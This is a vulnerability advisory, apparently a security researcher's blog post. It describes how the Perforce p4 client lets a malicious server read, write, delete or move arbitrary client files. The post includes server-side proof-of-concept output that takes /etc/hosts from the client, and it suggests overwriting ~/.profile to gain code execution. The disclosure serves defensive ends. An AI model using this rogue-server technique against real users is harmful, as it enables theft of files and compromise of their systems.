---
layout: post
title: Perforce - Helix Command-Line Client Arbitrary File Read / Write
category: bugreports
---

The `p4` Helix Command-Line Client accepts and responds to Perforce protocol commands supplied by a connected server without any validation. A malicious Perforce server can send arbitrary Perforce protocol commands to connecting clients in order to expose the contents of client system files or write arbitrary files on the client system.

<!--more-->

<pre class="bugreport">
Description:       Helix Command-Line Client Arbitrary File Read / Write
Versions Affected: 2014.1 through 2018.1
Category:          Arbitrary File Read / Write
Reporter:          Alex Chapman

Summary:
--------
The `p4` Helix Command-Line Client accepts and responds to Perforce protocol commands supplied by a connected server without any validation. A malicious Perforce server can send arbitrary Perforce protocol commands to connecting clients in order to expose the contents of client system files or write arbitrary files on the client system. Exploitation of this vulnerability could result in complete compromise of a client system.

Details:
--------
The `p4` Helix Command-Line Client responds to arbitrary server commands, no matter what stage of authentication (or lack thereof) the client has completed with the server. In addition to this, the `p4` client is not restricted to reading or writing files in certain directories.

Perforce protocol commands which can be sent by a server include:
* Read a specified file and send the contents to the server (`client-SendFile` command)
* Write arbitrary server specified data to a given file (`client-WriteFile` command)
* Delete arbitrary files (`client-DeleteFile` command)
* Move arbitrary files (`client-MoveFile` command)

Given these weaknesses by sending a `client-SendFile` as soon as a client connects, a malicious Perforce server can disclose the contents of arbitrary files from the client system. Alternatively sending a `client-WriteFile` command can be used to write arbitrary files, leading to compromise of the system.

Analysis:
---------
Exploitation of this vulnerability allows a malicious server to write arbitrary data to any file path accessible to the user running the `p4` client. As an example of exploiting this issue, overwriting a `~/.profile` on *nix base systems would allow for Remote Code Execution when the user next starts a shell. Alternatively, a malicious server can request the client send the contents of arbitrary files, potentially disclosing sensitive client information.

This issue could be exploited in several ways, including:
1. Abusing CI/CD systems which allow users to specify arbitrary Perforce servers from which to obtain source
2. Intercepting non-TLS encrypted p4 connections on untrusted networks (e.g. Public Wifi)
3. Convincing users through the use of social engineering techniques to connect to a malicious Perforce server

In order to remediate this issue consider restricting the p4 client to only responding to commands from an authenticated Perforce server. Additionally the p4 client should only be permitted to read and write files within a specified directory (supplied via the command line) or the current working directory.

Proof of Concept:
-----------------
See the Proof of Concept Python3 script at ***redacted***. Below is the server side output of this script when a p4 client connects using the `./p4 -p &lt;server_address&gt;:&lt;server_port&gt; login` command. This output shows the contents of the clients `/etc/host` file being sent to the server.

# python3 server.py 1667
p4server listening on 0.0.0.0:1667
Received connection
 &lt; Receiving commands
protocol(cmpfile='', client='85', api='99999', enableStreams='', enableGraph='', expandAndmaps='', host='ubuntu', port='perforce.example.com:1667', sndbuf='319487', rcvbu
f='319488')
 &gt; Sending commands
protocol(xfiles='7', server='3', server2='46', serverID='master', revver='9', tzoffset='0', security='3', sndbuf='34559', rcvbuf='280800', autoTune='1')
 &gt; Sending commands
client-Ping()
 &lt; Receiving commands
user-login(version='2018.2/LINUX26X86_64/1751184', autoLogin='', prog='p4', client='ubuntu', cwd='/home/user/p4', host='ubuntu', os='UNIX', user='user
', charset='1', clientCase='0')
 &gt; Sending commands
client-SendFile(handle='0', path='/etc/hosts', open='open_file_result', write='read_file_result', confirm='confirm', decline='decline')
 &gt; Sending commands
release()
 &lt; Receiving commands
dm-Ping()
 &lt; Receiving commands
open_file_result(fileSize='232', handle='0', path='/etc/hosts', open='open_file_result', write='read_file_result', confirm='confirm', decline='decline')
 &lt; Receiving commands
read_file_result(data='127.0.0.1\tlocalhost\n127.0.1.1\tubuntu\n...', handle='0')
Contents of '/etc/hosts':
        127.0.0.1       localhost
        127.0.1.1       ubuntu

        # The following lines are desirable for IPv6 capable hosts
        ::1     ip6-localhost ip6-loopback
        fe00::0 ip6-localnet
        ff00::0 ip6-mcastprefix
        ff02::1 ip6-allnodes
        ff02::2 ip6-allrouters

 &lt; Receiving commands
confirm(data='', fileSize='232', digest='0991B6FEC21002CDCA46AA738B3BBDA6', time='1568203510', handle='0', path='/etc/hosts', open='open_file_result', write='read_file_resul
t', confirm='confirm', decline='decline')
 &lt; Receiving commands
release2()

Timeline
--------
20190404 - No `security.txt` file available on `https://www.perforce.com`
20190404 - Reached out via ‘Contact Us’ form on the website for a security contact
20190408 - Reached out via email to `uk@perforce.com`, `info@perforce.com` and `security@perforce.com`
20190410 - Reached out on Twitter asking for a security contact at @perforce
20190410 - Informed someone would be in touch shortly
20190411 - Perforce support DM via Twitter
20190411 - Supplied perforce with vulnerability details
20190412 - Initial vendor response
20190418 - Confirmed expected behaviour and will not fix, suggested issue can be mitigated by the `P4CLIENTPATH` environment variable
</pre>
